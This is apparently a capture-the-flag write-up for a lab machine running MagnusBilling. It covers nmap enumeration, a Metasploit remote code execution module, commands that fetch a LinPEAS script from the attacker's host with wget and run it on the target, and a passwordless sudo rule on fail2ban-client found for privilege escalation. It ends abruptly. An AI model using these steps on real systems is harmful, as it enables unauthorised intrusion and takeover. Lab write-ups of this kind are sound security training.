# Billing
IP - 10.10.59.81

## Scanning and Enumeration
nmap scan:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|http-server-header: Apache/2.4.56 (Debian)
| http-title:             MagnusBilling
|Requested resource was http://10.10.59.81/mbilling/
| http-methods:
|  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|/mbilling/
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
```
dirsearch:
/robots.txt - found: /mbilling/

- MagnusBilling - found by going to HTML source code (ctrl + U)

## Exploit (msfconsole - Remote Code Execution)
- In msfconsole searched for MagnusBilling 
![image](https://github.com/user-attachments/assets/68f4782c-c1eb-4e5d-b169-ccba7dd631e7)
- set RHOST and LHOST and then ran the command
![image](https://github.com/user-attachments/assets/9d00dd2e-127f-4bfa-8a3b-9b850ad14913)

- Navigate /home > found user "magnus" and inside his files I found the first flag.
- found id
``` 
id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
``` 
- Executed LinPEAS to get more info about the machine:
1).``` python3 -m http.server 8000 ``` (opened new tab in the terminal and ran this command in LinPEAS directory)
2). On the target machine I ran those 3 commands: ``` wget http://10.6.41.41:8000/linpeas.sh -O /tmp/linpeas.sh ```
3). ``` chmod +x /tmp/linpeas.sh ```
4). ``` /tmp/linpeas.sh ```
5). results found:
```
Runas and Command-specific defaults for asterisk:
Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
(ALL) NOPASSWD: /usr/bin/fail2ban-client
```
> indicating that you can run fail2ban-client without a password


fff


![image](https://github.com/user-attachments/assets/ccf1934f-1b38-49a2-9288-182c3b35fc81)
![image](https://github.com/user-attachments/assets/e7ed40cb-c154-4ef2-ba5f-61ed88d15968)
